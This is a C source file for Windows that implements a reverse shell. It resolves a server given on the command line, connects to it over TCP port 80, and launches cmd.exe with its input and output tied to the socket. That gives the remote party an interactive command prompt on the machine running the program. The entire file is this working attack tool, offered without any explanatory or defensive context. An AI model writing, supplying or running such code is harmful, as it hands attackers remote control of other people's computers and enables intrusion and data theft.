#define _WIN32_WINNT 0x501
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>

#define DEFAULT_BUFLEN 20
#define DEFAULT_PORT "80"
int main(int argc,char **argv)
{
    if(argc!=2)
    {
        printf("useage %s server_name",argv[0]);
        return 1;

    }
    WSADATA wsadata;
    SOCKET connectsocket;
    struct addrinfo *result=NULL,*ptr=NULL,hints;
    const char *sendbuf="this is buff";

    char recvbuf[DEFAULT_BUFLEN];
    int iresult;

    iresult=WSAStartup(MAKEWORD(2,2),&wsadata);
    if(iresult!=0)
    {
        printf("WSA DATA ERROR!",iresult);
        return 1;
    }
    ZeroMemory(&hints,sizeof(hints));
    hints.ai_family=AF_UNSPEC;
    hints.ai_socktype=SOCK_STREAM;
    hints.ai_protocol=IPPROTO_TCP;
    iresult=getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if(iresult!=0)
    {
        printf("getaddrinfo fail %d",iresult);
        WSACleanup();
        return 1;
    }
    for(ptr=result;ptr!=NULL;ptr=ptr->ai_next)
    {
        connectsocket=WSASocket(ptr->ai_family,ptr->ai_socktype,ptr->ai_protocol,NULL,(unsigned int)NULL,(unsigned int)NULL);
        if(connectsocket==INVALID_SOCKET)
        {
            printf("INVALID SOCKET %ld",WSAGetLastError());
            WSACleanup();
            return 1;
        }
        iresult=connect(connectsocket,ptr->ai_addr,(int)ptr->ai_addrlen);
        if(iresult==SOCKET_ERROR)
        {
            closesocket(connectsocket);
            connectsocket=INVALID_SOCKET;
            continue;
        }
        break;
    }
    freeaddrinfo(result);
    if(connectsocket==INVALID_SOCKET)
    {
        printf("unable to connect socket %ld",WSAGetLastError());
        WSACleanup();
        return 1;
    }
        char process[]="cmd.exe";
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo,0,sizeof(sinfo));
        sinfo.cb=sizeof(sinfo);
        sinfo.dwFlags=(STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput=sinfo.hStdOutput=sinfo.hStdError=(HANDLE)connectsocket;
        CreateProcess(NULL,process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo,&pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);


}
